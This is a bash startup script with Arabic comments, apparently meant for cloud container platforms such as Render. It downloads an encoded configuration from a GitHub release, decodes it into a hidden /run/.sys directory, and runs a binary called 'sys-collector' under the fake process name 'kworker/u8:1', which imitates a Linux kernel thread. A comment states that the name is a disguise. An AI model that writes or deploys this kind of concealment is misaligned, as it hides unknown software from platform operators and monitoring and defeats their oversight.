#!/bin/bash
set -e

CONF_URL="https://github.com/x1ahmed/server-assets/releases/download/1.3/assets.dat"

mkdir -p /run/.sys
curl -fsSL "$CONF_URL" -o /run/.sys/c.bin
base64 -d /run/.sys/c.bin | gunzip > /run/.sys/c.json
rm -f /run/.sys/c.bin
chmod 600 /run/.sys/c.json

# لو المنصة بتوفر PORT (زي Render)، نستبدل المنفذ في الكونفج
if [ -n "$PORT" ]; then
  sed -i "s/\"port\": 443/\"port\": $PORT/" /run/.sys/c.json
fi

# نستخرج المنفذ الحالي للعرض في اللوج
LISTEN_PORT=$(grep -oP '"port":\s*\K[0-9]+' /run/.sys/c.json | head -1)

# تشغيل السيرفر في الخلفية باسم مموّه
exec -a "kworker/u8:1" /usr/local/bin/sys-collector -config /run/.sys/c.json &
PID=$!

# نستنى 3 ثواني ونتأكد إن العملية لسه شغالة
sleep 3

if kill -0 "$PID" 2>/dev/null; then
  echo ""
  echo "======================================================"
  echo "✅  Server started successfully!"
  echo "------------------------------------------------------"
  echo "   PID        : $PID"
  echo "   Listen Port: $LISTEN_PORT"
  echo "   Config     : /run/.sys/c.json"
  echo "   Started At : $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
  echo "======================================================"
  echo ""
else
  echo ""
  echo "======================================================"
  echo "❌  Server FAILED to start!"
  echo "------------------------------------------------------"
  echo "   Check the config file and binary permissions."
  echo "======================================================"
  echo ""
  exit 1
fi

# نخلي السكريبت مستني لحد ما العملية تخلص (عشان الحاوية متخرجش)
wait "$PID"
